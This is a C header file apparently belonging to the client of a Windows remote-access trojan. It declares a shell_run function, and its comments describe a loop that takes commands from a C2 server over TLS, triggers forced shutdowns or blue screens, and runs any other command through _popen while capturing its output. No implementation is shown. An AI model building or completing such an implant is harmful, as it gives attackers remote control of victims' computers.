/*
 * client/shell.h  –  Shell command-loop declaration
 * ==================================================
 * The command loop receives commands from the C2 over the encrypted TLS
 * channel, dispatches built-in actions (forceOff, blueScreen, quit), and
 * routes everything else through _popen() + captures stdout.
 */

#pragma once
#ifndef CLIENT_SHELL_H
#define CLIENT_SHELL_H

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <windows.h>
#include "../../tls/tls_client.h"

#ifdef __cplusplus
extern "C" {
#endif

/*
 * shell_run
 * ---------
 * Enter the receive-dispatch-respond loop.
 * Blocks until the connection drops or the C2 sends "q".
 *
 * Parameters
 *   pTls  – fully connected and authenticated TLS context
 *
 * Returns when the loop exits (connection lost or "q" received).
 */
void shell_run(TLS_CONTEXT *pTls);

#ifdef __cplusplus
}
#endif
#endif /* CLIENT_SHELL_H */
